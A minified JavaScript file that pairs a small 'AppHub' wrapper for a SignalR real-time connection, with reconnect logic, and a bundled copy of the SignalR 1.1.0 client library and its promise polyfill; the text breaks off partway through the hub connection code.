function AppHub() {
	var n = this;
	this.build = function(t) {
		n.options = {
			hubUrl: null,
			appId: null,
			subscriberId: null,
			reconnectMillisecondTimeout: 5e3
		};
		Object.assign(n.options, t);
		n.callbackConnectionLaid = function() {};
		n.callbackConnectionClose = function() {};
		n.callbackConnectionError = function() {};
		var i = "?appId=" + n.options.appId + "&subscriberId=" + n.options.subscriberId;
		n.hubConnection = (new signalR.HubConnectionBuilder).withUrl(n.options.hubUrl + i).build();
		n.hubConnection.onclose(function(t) {
			n.hubConnection != null && (t != null ? console.error("[AppHub] : " + t.message) : console.error("[AppHub] : e undefined"), n.callbackConnectionClose(t), n.reconnect())
		})
	};
	this.on = function(t, i) {
		n.hubConnection.on(t, i)
	};
	this.reconnect = function() {
		setTimeout(function() {
			n.start({
				isReconnect: !0
			})
		}, n.options.reconnectMillisecondTimeout)
	};
	this.start = function(t) {
		try {
			if (n.hubConnection == null) return;
			n.hubConnection.start().then(function() {
				if (n.hubConnection != null) {
					var i = {
						isReconnect: t.isReconnect
					};
					n.callbackConnectionLaid(i)
				}
			})["catch"](function(t) {
				if (n.hubConnection != null) return console.error("[AppHub] : " + t.message), n.callbackConnectionError(t), n.reconnect(), !0
			})
		} catch (i) {
			if (n.hubConnection == null) return;
			console.error("[AppHub] : " + i.message);
			n.callbackConnectionError(i);
			n.reconnect()
		}
	};
	this.subscribe = function() {
		n.start({
			isReconnect: !1
		})
	};
	this.stop = function() {
		try {
			n.hubConnection != null && (n.hubConnection.stop(), n.hubConnection = null)
		} catch (t) {
			console.error("[AppHub] : " + t.message)
		}
	}
}(function(n, t) {
	typeof exports == "object" && typeof module == "object" ? module.exports = t() : typeof define == "function" && define.amd ? define([], t) : typeof exports == "object" ? exports.signalR = t() : n.signalR = t()
})(window, function() {
	return function(n) {
		function t(r) {
			if (i[r]) return i[r].exports;
			var u = i[r] = {
				i: r,
				l: !1,
				exports: {}
			};
			return n[r].call(u.exports, u, u.exports, t), u.l = !0, u.exports
		}
		var i = {};
		return t.m = n, t.c = i, t.d = function(n, i, r) {
			t.o(n, i) || Object.defineProperty(n, i, {
				enumerable: !0,
				get: r
			})
		}, t.r = function(n) {
			typeof Symbol != "undefined" && Symbol.toStringTag && Object.defineProperty(n, Symbol.toStringTag, {
				value: "Module"
			});
			Object.defineProperty(n, "__esModule", {
				value: !0
			})
		}, t.t = function(n, i) {
			var r, u;
			if ((i & 1 && (n = t(n)), i & 8) || i & 4 && typeof n == "object" && n && n.__esModule) return n;
			if (r = Object.create(null), t.r(r), Object.defineProperty(r, "default", {
					enumerable: !0,
					value: n
				}), i & 2 && typeof n != "string")
				for (u in n) t.d(r, u, function(t) {
					return n[t]
				}.bind(null, u));
			return r
		}, t.n = function(n) {
			var i = n && n.__esModule ? function() {
				return n["default"]
			} : function() {
				return n
			};
			return t.d(i, "a", i), i
		}, t.o = function(n, t) {
			return Object.prototype.hasOwnProperty.call(n, t)
		}, t.p = "", t(t.s = 0)
	}([function(n, t, i) {
		"use strict";
		i.r(t);
		var u = i(1),
			f = i.n(u),
			r = i(3);
		i.d(t, "VERSION", function() {
			return r.VERSION
		});
		i.d(t, "AbortError", function() {
			return r.AbortError
		});
		i.d(t, "HttpError", function() {
			return r.HttpError
		});
		i.d(t, "TimeoutError", function() {
			return r.TimeoutError
		});
		i.d(t, "HttpClient", function() {
			return r.HttpClient
		});
		i.d(t, "HttpResponse", function() {
			return r.HttpResponse
		});
		i.d(t, "DefaultHttpClient", function() {
			return r.DefaultHttpClient
		});
		i.d(t, "HubConnection", function() {
			return r.HubConnection
		});
		i.d(t, "HubConnectionState", function() {
			return r.HubConnectionState
		});
		i.d(t, "HubConnectionBuilder", function() {
			return r.HubConnectionBuilder
		});
		i.d(t, "MessageType", function() {
			return r.MessageType
		});
		i.d(t, "LogLevel", function() {
			return r.LogLevel
		});
		i.d(t, "HttpTransportType", function() {
			return r.HttpTransportType
		});
		i.d(t, "TransferFormat", function() {
			return r.TransferFormat
		});
		i.d(t, "NullLogger", function() {
			return r.NullLogger
		});
		i.d(t, "JsonHubProtocol", function() {
			return r.JsonHubProtocol
		});
		Uint8Array.prototype.indexOf || Object.defineProperty(Uint8Array.prototype, "indexOf", {
			value: Array.prototype.indexOf,
			writable: !0
		});
		Uint8Array.prototype.slice || Object.defineProperty(Uint8Array.prototype, "slice", {
			value: Array.prototype.slice,
			writable: !0
		});
		Uint8Array.prototype.forEach || Object.defineProperty(Uint8Array.prototype, "forEach", {
			value: Array.prototype.forEach,
			writable: !0
		})
	}, function(n, t, i) {
		(function(t) {
			var r;
			(function(t, i) {
				n.exports = i()
			})(this, function() {
				"use strict";

				function kt(n) {
					var t = typeof n;
					return n !== null && (t === "object" || t === "function")
				}

				function et(n) {
					return typeof n == "function"
				}

				function dt(n) {
					d = n
				}

				function gt(n) {
					e = n
				}

				function ii() {
					return function() {
						return process.nextTick(h)
					}
				}

				function ri() {
					return typeof k != "undefined" ? function() {
						k(h)
					} : g()
				}

				function ui() {
					var n = 0,
						i = new lt(h),
						t = document.createTextNode("");
					return i.observe(t, {
							characterData: !0
						}),
						function() {
							t.data = n = ++n % 2
						}
				}

				function fi() {
					var n = new MessageChannel;
					return n.port1.onmessage = h,
						function() {
							return n.port2.postMessage(0)
						}
				}

				function g() {
					var n = setTimeout;
					return function() {
						return n(h, 1)
					}
				}

				function h() {
					for (var t, i, n = 0; n < s; n += 2) t = o[n], i = o[n + 1], t(i), o[n] = undefined, o[n + 1] = undefined;
					s = 0
				}

				function ei() {
					try {
						var t = r,
							n = i(! function() {
								var n = new Error("Cannot find module 'vertx'");
								n.code = "MODULE_NOT_FOUND";
								throw n;
							}());
						return k = n.runOnLoop || n.runOnContext, ri()
					} catch (f) {
						return g()
					}
				}

				function tt(n, t) {
					var u = this,
						i = new this.constructor(c),
						r, f;
					return i[v] === undefined && wt(i), r = u._state, r ? (f = arguments[r - 1], e(function() {
						return pt(r, i, f, u._result)
					})) : rt(u, i, n, t), i
				}

				function it(n) {
					var i = this,
						t;
					return n && typeof n == "object" && n.constructor === i ? n : (t = new i(c), w(t, n), t)
				}

				function c() {}

				function oi() {
					return new TypeError("You cannot resolve a promise with itself")
				}

				function si() {
					return new TypeError("A promises callback cannot return that same promise.")
				}

				function at(n) {
					try {
						return n.then
					} catch (t) {
						return p.error = t, p
					}
				}

				function hi(n, t, i, r) {
					try {
						n.call(t, i, r)
					} catch (u) {
						return u
					}
				}

				function ci(n, t, i) {
					e(function(n) {
						var r = !1,
							e = hi(i, t, function(i) {
								r || (r = !0, t !== i ? w(n, i) : f(n, i))
							}, function(t) {
								r || (r = !0, u(n, t))
							}, "Settle: " + (n._label || " unknown promise"));
						!r && e && (r = !0, u(n, e))
					}, n)
				}

				function li(n, t) {
					t._state === y ? f(n, t._result) : t._state === a ? u(n, t._result) : rt(t, undefined, function(t) {
						return w(n, t)
					}, function(t) {
						return u(n, t)
					})
				}

				function vt(n, t, i) {
					t.constructor === n.constructor && i === tt && t.constructor.resolve === it ? li(n, t) : i === p ? (u(n, p.error), p.error = null) : i === undefined ? f(n, t) : et(i) ? ci(n, t, i) : f(n, t)
				}

				function w(n, t) {
					n === t ? u(n, oi()) : kt(t) ? vt(n, t, at(t)) : f(n, t)
				}

				function ai(n) {
					n._onerror && n._onerror(n._result);
					ut(n)
				}

				function f(n, t) {
					n._state === l && (n._result = t, n._state = y, n._subscribers.length !== 0 && e(ut, n))
				}

				function u(n, t) {
					n._state === l && (n._state = a, n._result = t, e(ai, n))
				}

				function rt(n, t, i, r) {
					var u = n._subscribers,
						f = u.length;
					n._onerror = null;
					u[f] = t;
					u[f + y] = i;
					u[f + a] = r;
					f === 0 && n._state && e(ut, n)
				}

				function ut(n) {
					var i = n._subscribers,
						f = n._state,
						t;
					if (i.length !== 0) {
						var r = void 0,
							u = void 0,
							e = n._result;
						for (t = 0; t < i.length; t += 3) r = i[t], u = i[t + f], r ? pt(f, r, u, e) : u(e);
						n._subscribers.length = 0
					}
				}

				function yt() {
					this.error = null
				}

				function vi(n, t) {
					try {
						return n(t)
					} catch (i) {
						return b.error = i, b
					}
				}

				function pt(n, t, i, r) {
					var s = et(i),
						e = void 0,
						h = void 0,
						o = void 0,
						c = void 0;
					if (s) {
						if (e = vi(i, r), e === b ? (c = !0, h = e.error, e.error = null) : o = !0, t === e) {
							u(t, si());
							return
						}
					} else e = r, o = !0;
					t._state !== l || (s && o ? w(t, e) : c ? u(t, h) : n === y ? f(t, e) : n === a && u(t, e))
				}

				function yi(n, t) {
					try {
						t(function(t) {
							w(n, t)
						}, function(t) {
							u(n, t)
						})
					} catch (i) {
						u(n, i)
					}
				}

				function pi() {
					return ft++
				}

				function wt(n) {
					n[v] = ft++;
					n._state = undefined;
					n._result = undefined;
					n._subscribers = []
				}

				function wi() {
					return new Error("Array Methods must be provided an Array")
				}

				function wi() {
					return new Error("Array Methods must be provided an Array")
				}

				function bi(n) {
					return new bt(this, n).promise
				}

				function ki(n) {
					var t = this;
					return st(n) ? new t(function(i, r) {
						for (var f = n.length, u = 0; u < f; u++) t.resolve(n[u]).then(i, r)
					}) : new t(function(n, t) {
						return t(new TypeError("You must pass an array to race."))
					})
				}

				function di(n) {
					var i = this,
						t = new i(c);
					return u(t, n), t
				}

				function gi() {
					throw new TypeError("You must pass a resolver function as the first argument to the promise constructor");
				}

				function nr() {
					throw new TypeError("Failed to construct 'Promise': Please use the 'new' operator, this object constructor cannot be called as a function.");
				}

				function tr() {
					var i = void 0,
						r, u;
					if (typeof t != "undefined") i = t;
					else if (typeof self != "undefined") i = self;
					else try {
						i = Function("return this")()
					} catch (f) {
						throw new Error("polyfill failed because global object is unavailable in this environment");
					}
					if (r = i.Promise, r) {
						u = null;
						try {
							u = Object.prototype.toString.call(r.resolve())
						} catch (f) {}
						if (u === "[object Promise]" && !r.cast) return
					}
					i.Promise = n
				}
				var ot = void 0,
					o, nt, v, b, ft, bt, n;
				ot = Array.isArray ? Array.isArray : function(n) {
					return Object.prototype.toString.call(n) === "[object Array]"
				};
				var st = ot,
					s = 0,
					k = void 0,
					d = void 0,
					e = function(n, t) {
						o[s] = n;
						o[s + 1] = t;
						s += 2;
						s === 2 && (d ? d(h) : nt())
					};
				var ht = typeof window != "undefined" ? window : undefined,
					ct = ht || {},
					lt = ct.MutationObserver || ct.WebKitMutationObserver,
					ni = typeof self == "undefined" && typeof process != "undefined" && {}.toString.call(process) === "[object process]",
					ti = typeof Uint8ClampedArray != "undefined" && typeof importScripts != "undefined" && typeof MessageChannel != "undefined";
				o = new Array(1e3);
				nt = void 0;
				nt = ni ? ii() : lt ? ui() : ti ? fi() : ht === undefined && !0 ? ei() : g();
				v = Math.random().toString(36).substring(16);
				var l = void 0,
					y = 1,
					a = 2,
					p = new yt;
				return b = new yt, ft = 0, bt = function() {
					function t(n, t) {
						this._instanceConstructor = n;
						this.promise = new n(c);
						this.promise[v] || wt(this.promise);
						st(t) ? (this.length = t.length, this._remaining = t.length, this._result = new Array(this.length), this.length === 0 ? f(this.promise, this._result) : (this.length = this.length || 0, this._enumerate(t), this._remaining === 0 && f(this.promise, this._result))) : u(this.promise, wi())
					}
					return t.prototype._enumerate = function(n) {
						for (var t = 0; this._state === l && t < n.length; t++) this._eachEntry(n[t], t)
					}, t.prototype._eachEntry = function(t, i) {
						var r = this._instanceConstructor,
							e = r.resolve,
							u, f;
						e === it ? (u = at(t), u === tt && t._state !== l ? this._settledAt(t._state, i, t._result) : typeof u != "function" ? (this._remaining--, this._result[i] = t) : r === n ? (f = new r(c), vt(f, t, u), this._willSettleAt(f, i)) : this._willSettleAt(new r(function(n) {
							return n(t)
						}), i)) : this._willSettleAt(e(t), i)
					}, t.prototype._settledAt = function(n, t, i) {
						var r = this.promise;
						r._state === l && (this._remaining--, n === a ? u(r, i) : this._result[t] = i);
						this._remaining === 0 && f(r, this._result)
					}, t.prototype._willSettleAt = function(n, t) {
						var i = this;
						rt(n, undefined, function(n) {
							return i._settledAt(y, t, n)
						}, function(n) {
							return i._settledAt(a, t, n)
						})
					}, t
				}(), n = function() {
					function n(t) {
						this[v] = pi();
						this._result = this._state = undefined;
						this._subscribers = [];
						c !== t && (typeof t != "function" && gi(), this instanceof n ? yi(this, t) : nr())
					}
					return n.prototype.catch = function(n) {
						return this.then(null, n)
					}, n.prototype.finally = function(n) {
						var t = this,
							i = t.constructor;
						return t.then(function(t) {
							return i.resolve(n()).then(function() {
								return t
							})
						}, function(t) {
							return i.resolve(n()).then(function() {
								throw t;
							})
						})
					}, n
				}(), n.prototype.then = tt, n.all = bi, n.race = ki, n.resolve = it, n.reject = di, n._setScheduler = dt, n._setAsap = gt, n._asap = e, n.polyfill = tr, n.Promise = n, n.polyfill(), n
			})
		}).call(this, i(2))
	}, function(n) {
		var t = function() {
			return this
		}();
		try {
			t = t || Function("return this")() || eval("this")
		} catch (i) {
			typeof window == "object" && (t = window)
		}
		n.exports = t
	}, function(n, t, i) {
		"use strict";
		var r, u, o, f, s, h, c, e, l, a, v;
		i.r(t);
		i.d(t, "VERSION", function() {
			return v
		});
		r = i(4);
		i.d(t, "AbortError", function() {
			return r.AbortError
		});
		i.d(t, "HttpError", function() {
			return r.HttpError
		});
		i.d(t, "TimeoutError", function() {
			return r.TimeoutError
		});
		u = i(5);
		i.d(t, "HttpClient", function() {
			return u.HttpClient
		});
		i.d(t, "HttpResponse", function() {
			return u.HttpResponse
		});
		o = i(6);
		i.d(t, "DefaultHttpClient", function() {
			return o.DefaultHttpClient
		});
		f = i(9);
		i.d(t, "HubConnection", function() {
			return f.HubConnection
		});
		i.d(t, "HubConnectionState", function() {
			return f.HubConnectionState
		});
		s = i(15);
		i.d(t, "HubConnectionBuilder", function() {
			return s.HubConnectionBuilder
		});
		h = i(14);
		i.d(t, "MessageType", function() {
			return h.MessageType
		});
		c = i(8);
		i.d(t, "LogLevel", function() {
			return c.LogLevel
		});
		e = i(17);
		i.d(t, "HttpTransportType", function() {
			return e.HttpTransportType
		});
		i.d(t, "TransferFormat", function() {
			return e.TransferFormat
		});
		l = i(13);
		i.d(t, "NullLogger", function() {
			return l.NullLogger
		});
		a = i(22);
		i.d(t, "JsonHubProtocol", function() {
			return a.JsonHubProtocol
		});
		v = "1.1.0"
	}, function(n, t, i) {
		"use strict";
		i.r(t);
		i.d(t, "HttpError", function() {
			return u
		});
		i.d(t, "TimeoutError", function() {
			return f
		});
		i.d(t, "AbortError", function() {
			return e
		});
		var r = undefined && undefined.__extends || function() {
				var n = Object.setPrototypeOf || {
					__proto__: []
				}
				instanceof Array && function(n, t) {
					n.__proto__ = t
				} || function(n, t) {
					for (var i in t) t.hasOwnProperty(i) && (n[i] = t[i])
				};
				return function(t, i) {
					function r() {
						this.constructor = t
					}
					n(t, i);
					t.prototype = i === null ? Object.create(i) : (r.prototype = i.prototype, new r)
				}
			}(),
			u = function(n) {
				function t(t, i) {
					var u = this.constructor,
						r = this,
						f = u.prototype;
					return r = n.call(this, t) || this, r.statusCode = i, r.__proto__ = f, r
				}
				return r(t, n), t
			}(Error),
			f = function(n) {
				function t(t) {
					var u = this.constructor,
						i, r;
					return t === void 0 && (t = "A timeout occurred."), i = this, r = u.prototype, i = n.call(this, t) || this, i.__proto__ = r, i
				}
				return r(t, n), t
			}(Error),
			e = function(n) {
				function t(t) {
					var u = this.constructor,
						i, r;
					return t === void 0 && (t = "An abort occurred."), i = this, r = u.prototype, i = n.call(this, t) || this, i.__proto__ = r, i
				}
				return r(t, n), t
			}(Error)
	}, function(n, t, i) {
		"use strict";
		i.r(t);
		i.d(t, "HttpResponse", function() {
			return u
		});
		i.d(t, "HttpClient", function() {
			return f
		});
		var r = undefined && undefined.__assign || Object.assign || function(n) {
				for (var t, r, i = 1, u = arguments.length; i < u; i++) {
					t = arguments[i];
					for (r in t) Object.prototype.hasOwnProperty.call(t, r) && (n[r] = t[r])
				}
				return n
			},
			u = function() {
				function n(n, t, i) {
					this.statusCode = n;
					this.statusText = t;
					this.content = i
				}
				return n
			}(),
			f = function() {
				function n() {}
				return n.prototype.get = function(n, t) {
					return this.send(r({}, t, {
						method: "GET",
						url: n
					}))
				}, n.prototype.post = function(n, t) {
					return this.send(r({}, t, {
						method: "POST",
						url: n
					}))
				}, n.prototype.delete = function(n, t) {
					return this.send(r({}, t, {
						method: "DELETE",
						url: n
					}))
				}, n.prototype.getCookieString = function() {
					return ""
				}, n
			}()
	}, function(n, t, i) {
		"use strict";
		var u, f;
		i.r(t);
		i.d(t, "DefaultHttpClient", function() {
			return f
		});
		var e = i(4),
			o = i(5),
			s = i(7),
			h = undefined && undefined.__extends || function() {
				var n = Object.setPrototypeOf || {
					__proto__: []
				}
				instanceof Array && function(n, t) {
					n.__proto__ = t
				} || function(n, t) {
					for (var i in t) t.hasOwnProperty(i) && (n[i] = t[i])
				};
				return function(t, i) {
					function r() {
						this.constructor = t
					}
					n(t, i);
					t.prototype = i === null ? Object.create(i) : (r.prototype = i.prototype, new r)
				}
			}(),
			r;
		typeof XMLHttpRequest == "undefined" && (u = require, r = u("./NodeHttpClient"));
		f = function(n) {
			function t(t) {
				var i = n.call(this) || this;
				if (typeof XMLHttpRequest != "undefined") i.httpClient = new s.XhrHttpClient(t);
				else if (typeof r != "undefined") i.httpClient = new r.NodeHttpClient(t);
				else throw new Error("No HttpClient could be created.");
				return i
			}
			return h(t, n), t.prototype.send = function(n) {
				return n.abortSignal && n.abortSignal.aborted ? Promise.reject(new e.AbortError) : n.method ? n.url ? this.httpClient.send(n) : Promise.reject(new Error("No url defined.")) : Promise.reject(new Error("No method defined."))
			}, t.prototype.getCookieString = function(n) {
				return this.httpClient.getCookieString(n)
			}, t
		}(o.HttpClient)
	}, function(n, t, i) {
		"use strict";
		i.r(t);
		i.d(t, "XhrHttpClient", function() {
			return o
		});
		var r = i(4),
			u = i(5),
			f = i(8),
			e = undefined && undefined.__extends || function() {
				var n = Object.setPrototypeOf || {
					__proto__: []
				}
				instanceof Array && function(n, t) {
					n.__proto__ = t
				} || function(n, t) {
					for (var i in t) t.hasOwnProperty(i) && (n[i] = t[i])
				};
				return function(t, i) {
					function r() {
						this.constructor = t
					}
					n(t, i);
					t.prototype = i === null ? Object.create(i) : (r.prototype = i.prototype, new r)
				}
			}(),
			o = function(n) {
				function t(t) {
					var i = n.call(this) || this;
					return i.logger = t, i
				}
				return e(t, n), t.prototype.send = function(n) {
					var t = this;
					return n.abortSignal && n.abortSignal.aborted ? Promise.reject(new r.AbortError) : n.method ? n.url ? new Promise(function(i, e) {
						var o = new XMLHttpRequest,
							s;
						o.open(n.method, n.url, !0);
						o.withCredentials = !0;
						o.setRequestHeader("X-Requested-With", "XMLHttpRequest");
						o.setRequestHeader("Content-Type", "text/plain;charset=UTF-8");
						s = n.headers;
						s && Object.keys(s).forEach(function(n) {
							o.setRequestHeader(n, s[n])
						});
						n.responseType && (o.responseType = n.responseType);
						n.abortSignal && (n.abortSignal.onabort = function() {
							o.abort();
							e(new r.AbortError)
						});
						n.timeout && (o.timeout = n.timeout);
						o.onload = function() {
							n.abortSignal && (n.abortSignal.onabort = null);
							o.status >= 200 && o.status < 300 ? i(new u.HttpResponse(o.status, o.statusText, o.response || o.responseText)) : e(new r.HttpError(o.statusText, o.status))
						};
						o.onerror = function() {
							t.logger.log(f.LogLevel.Warning, "Error from HTTP request. " + o.status + ": " + o.statusText + ".");
							e(new r.HttpError(o.statusText, o.status))
						};
						o.ontimeout = function() {
							t.logger.log(f.LogLevel.Warning, "Timeout from HTTP request.");
							e(new r.TimeoutError)
						};
						o.send(n.content || "")
					}) : Promise.reject(new Error("No url defined.")) : Promise.reject(new Error("No method defined."))
				}, t
			}(u.HttpClient)
	}, function(n, t, i) {
		"use strict";
		i.r(t);
		i.d(t, "LogLevel", function() {
			return r
		});
		var r;
		(function(n) {
			n[n.Trace = 0] = "Trace";
			n[n.Debug = 1] = "Debug";
			n[n.Information = 2] = "Information";
			n[n.Warning = 3] = "Warning";
			n[n.Error = 4] = "Error";
			n[n.Critical = 5] = "Critical";
			n[n.None = 6] = "None"
		})(r || (r = {}))
	}, function(n, t, i) {
		"use strict";
		var h;
		i.r(t);
		i.d(t, "HubConnectionState", function() {
			return f
		});
		i.d(t, "HubConnection", function() {
			return h
		});
		var c = i(10),
			r = i(14),
			u = i(8),
			e = i(12),
			o = undefined && undefined.__awaiter || function(n, t, i, r) {
				return new(i || (i = Promise))(function(u, f) {
					function o(n) {
						try {
							e(r.next(n))
						} catch (t) {
							f(t)
						}
					}

					function s(n) {
						try {
							e(r["throw"](n))
						} catch (t) {
							f(t)
						}
					}

					function e(n) {
						n.done ? u(n.value) : new i(function(t) {
							t(n.value)
						}).then(o, s)
					}
					e((r = r.apply(n, t || [])).next())
				})
			},
			s = undefined && undefined.__generator || function(n, t) {
				function o(n) {
					return function(t) {
						return s([n, t])
					}
				}

				function s(e) {
					if (f) throw new TypeError("Generator is already executing.");
					while (r) try {
						if (f = 1, u && (i = e[0] & 2 ? u["return"] : e[0] ? u["throw"] || ((i = u["return"]) && i.call(u), 0) : u.next) && !(i = i.call(u, e[1])).done) return i;
						(u = 0, i) && (e = [e[0] & 2, i.value]);
						switch (e[0]) {
							case 0:
							case 1:
								i = e;
								break;
							case 4:
								return r.label++, {
									value: e[1],
									done: !1
								};
							case 5:
								r.label++;
								u = e[1];
								e = [0];
								continue;
							case 7:
								e = r.ops.pop();
								r.trys.pop();
								continue;
							default:
								if (!(i = r.trys, i = i.length > 0 && i[i.length - 1]) && (e[0] === 6 || e[0] === 2)) {
									r = 0;
									continue
								}
								if (e[0] === 3 && (!i || e[1] > i[0] && e[1] < i[3])) {
									r.label = e[1];
									break
								}
								if (e[0] === 6 && r.label < i[1]) {
									r.label = i[1];
									i = e;
									break
								}
								if (i && r.label < i[2]) {
									r.label = i[2];
									r.ops.push(e);
									break
								}
								i[2] && r.ops.pop();
								r.trys.pop();
								continue
						}
						e = t.call(n, r)
					} catch (o) {
						e = [6, o];
						u = 0
					} finally {
						f = i = 0
					}
					if (e[0] & 5) throw e[1];
					return {
						value: e[0] ? e[1] : void 0,
						done: !0
					}
				}
				var r = {
						label: 0,
						sent: function() {
							if (i[0] & 1) throw i[1];
							return i[1]
						},
						trys: [],
						ops: []
					},
					f, u, i, e;
				return e = {
					next: o(0),
					"throw": o(1),
					"return": o(2)
				}, typeof Symbol == "function" && (e[Symbol.iterator] = function() {
					return this
				}), e
			},
			l = 3e4,
			a = 15e3,
			f;
		(function(n) {
			n[n.Disconnected = 0] = "Disconnected";
			n[n.Connected = 1] = "Connected"
		})(f || (f = {}));
		h = function() {
			function n(n, t, i) {
				var u = this;
				e.Arg.isRequired(n, "connection");
				e.Arg.isRequired(t, "logger");
				e.Arg.isRequired(i, "protocol");
				this.serverTimeoutInMilliseconds = l;
				this.keepAliveIntervalInMilliseconds = a;
				this.logger = t;
				this.protocol = i;
				this.connection = n;
				this.handshakeProtocol = new c.HandshakeProtocol;
				this.connection.onreceive = function(n) {
					return u.processIncomingData(n)
				};
				this.connection.onclose = function(n) {
					return u.connectionClosed(n)
				};
				this.callbacks = {};
				this.methods = {};
				this.closedCallbacks = [];
				this.id = 0;
				this.receivedHandshakeResponse = !1;
				this.connectionState = f.Disconnected;
				this.cachedPingMessage = this.protocol.writeMessage({
					type: r.MessageType.Ping
				})
			}
			return n.create = function(t, i, r) {
				return new n(t, i, r)
			}, Object.defineProperty(n.prototype, "state", {
				get: function() {
					return this.connectionState
				},
				enumerable: !0,
				configurable: !0
			}), n.prototype.start = function() {
				return o(this, void 0, void 0, function() {
					var n, t, i = this;
					return s(this, function(r) {
						switch (r.label) {
							case 0:
								return n = {
									protocol: this.protocol.name,
									version: this.protocol.version
								}, this.logger.log(u.LogLevel.Debug, "Starting HubConnection."), this.receivedHandshakeResponse = !1, t = new Promise(function(n, t) {
									i.handshakeResolver = n;
									i.handshakeRejecter = t
								}), [4, this.connection.start(this.protocol.transferFormat)];
							case 1:
								return r.sent(), this.logger.log(u.LogLevel.Debug, "Sending handshake request."), [4, this.sendMessage(this.handshakeProtocol.writeHandshakeRequest(n))];
							case 2:
								return r.sent(), this.logger.log(u.LogLevel.Information, "Using HubProtocol '" + this.protocol.name + "'."), this.cleanupTimeout(), this.resetTimeoutPeriod(), this.resetKeepAliveInterval(), [4, t];
							case 3:
								return r.sent(), this.connectionState = f.Connected, [2]
						}
					})
				})
			}, n.prototype.stop = function() {
				return this.logger.log(u.LogLevel.Debug, "Stopping HubConnection."), this.cleanupTimeout(), this.cleanupPingTimer(), this.connection.stop()
			}, n.prototype.stream = function(n) {
				for (var u = this, o = [], i, t, s, f = 1; f < arguments.length; f++) o[f - 1] = arguments[f];
				return i = this.createStreamInvocation(n, o), t = new e.Subject(function() {
					var n = u.createCancelInvocation(i.invocationId),
						t = u.protocol.writeMessage(n);
					return delete u.callbacks[i.invocationId], u.sendMessage(t)
				}), this.callbacks[i.invocationId] = function(n, i) {
					if (i) {
						t.error(i);
						return
					}
					n && (n.type === r.MessageType.Completion ? n.error ? t.error(new Error(n.error)) : t.complete() : t.next(n.item))
				}, s = this.protocol.writeMessage(i), this.sendMessage(s).catch(function(n) {
					t.error(n);
					delete u.callbacks[i.invocationId]
				}), t
			}, n.prototype.sendMessage = function(n) {
				return this.resetKeepAliveInterval(), this.connection.send(n)
			}, n.prototype.send = function(n) {
				for (var i = [], r, u, t = 1; t < arguments.length; t++) i[t - 1] = arguments[t];
				return r = this.createInvocation(n, i, !0), u = this.protocol.writeMessage(r), this.sendMessage(u)
			}, n.prototype.invoke = function(n) {
				for (var i = this, f = [], u, e, t = 1; t < arguments.length; t++) f[t - 1] = arguments[t];
				return u = this.createInvocation(n, f, !1), e = new Promise(function(n, t) {
					i.callbacks[u.invocationId] = function(i, u) {
						if (u) {
							t(u);
							return
						}
						i && (i.type === r.MessageType.Completion ? i.error ? t(new Error(i.error)) : n(i.result) : t(new Error("Unexpected message type: " + i.type)))
					};
					var f = i.protocol.writeMessage(u);
					i.sendMessage(f).catch(function(n) {
						t(n);
						delete i.callbacks[u.invocationId]
					})
				}), e
			}, n.prototype.on = function(n, t) {
				n && t && (n = n.toLowerCase(), this.methods[n] || (this.methods[n] = []), this.methods[n].indexOf(t) === -1) && this.methods[n].push(t)
			}, n.prototype.off = function(n, t) {
				var i, r;
				n && (n = n.toLowerCase(), i = this.methods[n], i) && (t ? (r = i.indexOf(t), r !== -1 && (i.splice(r, 1), i.length === 0 && delete this.methods[n])) : delete this.methods[n])
			}, n.prototype.onclose = function(n) {
				n && this.closedCallbacks.push(n)
			}, n.prototype.processIncomingData = function(n) {
				var o, i, f, t, e;
				if (this.cleanupTimeout(), this.receivedHandshakeResponse || (n = this.processHandshakeResponse(n), this.receivedHandshakeResponse = !0), n)
					for (o = this.protocol.parseMessages(n, this.logger), i = 0, f = o; i < f.length; i++) {
						t = f[i];
						switch (t.type) {
							case r.MessageType.Invocation:
								this.invokeClientMethod(t);
								break;
							case r.MessageType.StreamItem:
							case r.MessageType.Completion:
								e = this.callbacks[t.invocationId];
								e != null && (t.type === r.MessageType.Completion && delete this.callbacks[t.invocationId], e(t));
								break;
							case r.MessageType.Ping:
								break;
							case r.MessageType.Close:
								this.logger.log(u.LogLevel.Information, "Close message received from server.");
								this.connection.stop(t.error ? new Error("Server returned an error on close: " + t.error) : undefined);
								break;
							default:
								this.logger.log(u.LogLevel.Warning, "Invalid message type: " + t.type + ".")
						}
					}
				this.resetTimeoutPeriod()
			}, n.prototype.processHandshakeResponse = function(n) {
				var r, f, e, i, t;
				try {
					r = this.handshakeProtocol.parseHandshakeResponse(n);
					e = r[0];
					f = r[1]
				} catch (o) {
					t = "Error parsing handshake response: " + o;
					this.logger.log(u.LogLevel.Error, t);
					i = new Error(t);
					this.connection.stop(i);
					this.handshakeRejecter(i);
					throw i;
				}
				if (f.error) {
					t = "Server returned handshake error: " + f.error;
					this.logger.log(u.LogLevel.Error, t);
					this.handshakeRejecter(t);
					this.connection.stop(new Error(t));
					throw new Error(t);
				} else this.logger.log(u.LogLevel.Debug, "Server handshake complete.");
				return this.handshakeResolver(), e
			}, n.prototype.resetKeepAliveInterval = function() {
				var n = this;
				this.cleanupPingTimer();
				this.pingServerHandle = setTimeout(function() {
					return o(n, void 0, void 0, function() {
						var n;
						return s(this, function(t) {
							switch (t.label) {
								case 0:
									if (!(this.connectionState === f.Connected)) return [3, 4];
									t.label = 1;
								case 1:
									return t.trys.push([1, 3, , 4]), [4, this.sendMessage(this.cachedPingMessage)];
								case 2:
									return t.sent(), [3, 4];
								case 3:
									return n = t.sent(), this.cleanupPingTimer(), [3, 4];
								case 4:
									return [2]
							}
						})
					})
				}, this.keepAliveIntervalInMilliseconds)
			}, n.prototype.resetTimeoutPeriod = function() {
				var n = this;
				this.connection.features && this.connection.features.inherentKeepAlive || (this.timeoutHandle = setTimeout(function() {
					return n.serverTimeout()
				}, this.serverTimeoutInMilliseconds))
			}, n.prototype.serverTimeout = function() {
				this.connection.stop(new Error("Server timeout elapsed without receiving a message from the server."))
			}, n.prototype.invokeClientMethod = function(n) {
				var r = this,
					i = this.methods[n.target.toLowerCase()],
					t;
				i ? (i.forEach(function(t) {
					return t.apply(r, n.arguments)
				}), n.invocationId && (t = "Server requested a response, which is not supported in this version of the client.", this.logger.log(u.LogLevel.Error, t), this.connection.stop(new Error(t)))) : this.logger.log(u.LogLevel.Warning, "No client method with the name '" + n.target + "' found.")
			}, n.prototype.connectionClosed = function(n) {
				var i = this,
					t = this.callbacks;
				this.callbacks = {};
				this.connectionState = f.Disconnected;
				this.handshakeRejecter && this.handshakeRejecter(n);
				Object.keys(t).forEach(function(i) {
					var r = t[i];
